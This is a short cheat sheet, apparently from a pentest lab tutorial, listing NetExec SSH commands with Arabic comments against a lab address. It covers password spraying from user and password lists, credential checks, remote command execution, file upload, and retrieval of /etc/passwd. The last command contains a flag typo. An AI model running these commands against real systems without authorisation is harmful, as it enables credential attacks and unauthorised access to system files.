nxc ssh 192.168.1.52 -u user.txt -p pass.txt #SSH authentication
nxc ssh 192.168.1.52 -u ignite -p 123 # التحقق من صحة مصادقة بيانات الاعتماد
nxc ssh 192.168.1.52 -u ignite -p 123 -x ifconfig #تنفيذ الأوامر عن بعد
#الفكرة الأساسية لهذه الخطوة هي إثبات قابلية القناة المُصادق عليها للكتابة
nxc ssh 192.168.1.52 -u ignite -p 123 --put-file file.txt /tmp/file.txt #وضع الملف (اختبار الترشيح)
nxc ssh 192.168.1.52 -ignite -p 123 --get-file /etc/passwd passwd #الحصول على الملف (نقل أداة الدخول)

